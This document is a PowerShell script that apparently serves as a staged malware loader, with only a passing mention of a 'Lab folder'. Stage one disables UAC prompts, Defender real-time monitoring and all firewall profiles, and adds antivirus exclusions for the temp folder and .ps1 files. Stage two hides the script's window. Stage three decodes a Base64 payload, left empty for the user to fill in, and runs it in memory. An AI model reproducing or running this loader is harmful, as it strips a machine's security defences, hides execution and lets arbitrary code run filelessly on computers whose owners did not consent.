try {
    # Disable UAC Prompts
    Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0
    
    # Disable Defender Real-time Monitoring
    Set-MpPreference -DisableRealtimeMonitoring $true
    
    # Disable Network Firewall
    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
    
    # Add Exclusions for your Lab folder
    Add-MpPreference -ExclusionPath "$env:TEMP"
    Add-MpPreference -ExclusionExtension ".ps1"
} catch {
    # Usually fails if not running as Administrator
    Write-Warning "Administrative privileges required for Stage 1."
}

# --- STAGE 2: WINDOW HIDER ---
$ms = @'
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'@
# $type = Add-Type -MemberDefinition $ms -Name ("W32_" + (Get-Random)) -Namespace "Win32" -PassThru
$type = Add-Type -MemberDefinition $ms -Name "Win32" -Namespace "Win32" -PassThru
$type::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)

# --- STAGE 3: MEMORY EXECUTION (The Payload) ---
# Replace this with your full Base64 encoded script from the previous steps
$GlobalPayload = ""

try {
    $decodedBytes = [System.Convert]::FromBase64String($GlobalPayload)
    $decodedScript = [System.Text.Encoding]::Unicode.GetString($decodedBytes)
    $scriptBlock = [scriptblock]::Create($decodedScript)
    
    # Execute in memory
    Invoke-Command -ScriptBlock $scriptBlock
}
catch {
    $_.Exception.Message | Out-File "$env:TEMP\payload_debug.txt" -Append
}